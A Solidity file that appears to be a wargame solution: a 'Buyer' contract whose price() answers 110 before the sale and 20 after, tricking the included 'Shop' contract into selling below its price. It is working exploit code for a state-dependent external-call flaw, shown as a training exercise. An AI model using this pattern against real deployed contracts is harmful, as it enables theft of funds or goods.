// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Buyer {

    
     uint cheap = 20;
     Shop shop;

constructor(address _instanceAddr) public {
     shop = Shop(_instanceAddr);
}
  
  function price() external view returns (uint){
      uint value = 110;
      uint result;
      if (shop.isSold() == false){
        result = value;
      } else {
          result = cheap;
      }
      return result;
  }

  function Hack() public {
        shop.buy();
  }
}

contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }
}